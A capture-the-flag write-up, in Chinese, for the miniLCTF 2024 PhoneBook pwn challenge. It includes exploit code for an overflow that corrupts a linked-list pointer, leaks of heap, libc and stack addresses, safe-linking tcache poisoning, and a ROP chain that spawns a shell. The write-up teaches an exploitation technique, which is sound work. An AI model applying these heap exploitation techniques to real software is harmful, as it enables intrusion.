# miniLCTF 2024 PhoneBook Writeup

## 题目简述

程序用固定大小堆块维护单链表电话簿。节点包含索引、16 字节姓名、8 字节电话和 `next` 指针；读取电话号码时允许 11 字节输入，因此可越过 8 字节字段，用 3 个字节部分覆盖后继指针。利用目标是把链表遍历导向任意地址，依次泄露堆、libc 与栈，再通过 safe-linking 下的 tcache poisoning 把 ROP 链写到保存返回地址。

## 解题过程

### 从链表指针溢出建立读写原语

先创建相邻节点，让第二个节点的 8 字节电话字段没有终止符。列表输出越过该字段继续打印 `next`，由泄露值减去固定偏移得到堆基址：

```python
add(b"A", b"0")
add(b"A", b"1" * 8)
add(b"A", b"0")
show()

io.recvuntil(b"1" * 8)
heap_base = u64(io.recv(6).ljust(8, b"\0")) - 0x330
```

接着在堆上伪造大小为 `0x4a1` 的块，把某个节点的 `next` 低字节改到伪造块并释放，使其进入 unsorted bin。再次把链表指向该块的 `fd`/`bk` 区域即可泄露 main arena，官方附件对应：

```python
libc_base = leak - 0x219ce0
environ = libc_base + libc.symbols["environ"]
```

这些偏移依赖题目随附的 `libc.so.6`，不能替换系统 libc 后照搬。

### 由 environ 定位返回地址

利用 3 字节 `next` 部分覆盖，把链表节点指向 `environ - 0x18`，列表显示会打印环境指针。该指针位于主线程栈上，再减附件实测偏移 `0x148` 得到目标保存返回地址附近的位置：

```python
edit(1, b"A", p64(environ - 0x18))
show()
stack_target = leaked_environ - 0x148
```

### safe-linking tcache poisoning

释放两个同尺寸节点形成 tcache 链。glibc safe-linking 保存的 `fd` 不是裸指针，而是：

$$\text{encoded\_fd}=\text{target}\oplus(\text{chunk\_address}\gg12).$$

```python
chunk_addr = heap_base + 0x420
encoded_fd = stack_target ^ (chunk_addr >> 12)
edit(poison_index, p64(encoded_fd), b"A")
```

连续申请两次后，第二次分配落到栈上。节点的 `name` 与 `phone` 合计可控 24 字节，正好写入：

```text
pop rdi ; ret
address of "/bin/sh"
system
```

官方利用因栈对齐和所用 libc 的入口布局，对 `system` 地址做了相应调整；复现时应在随附 loader/libc 下检查 RSP 是否 16 字节对齐。ROP 返回后获得 shell，再读取 flag。

## 方法总结

3 字节溢出看似很弱，但堆地址位于同一映射时足以改写链表低位并把遍历导向附近对象。完整利用链是“链表泄露堆 → 伪造 unsorted chunk 泄露 libc → environ 泄露栈 → safe-linking tcache poisoning 写返回地址”。所有固定偏移都应与附件 libc 一起验证。
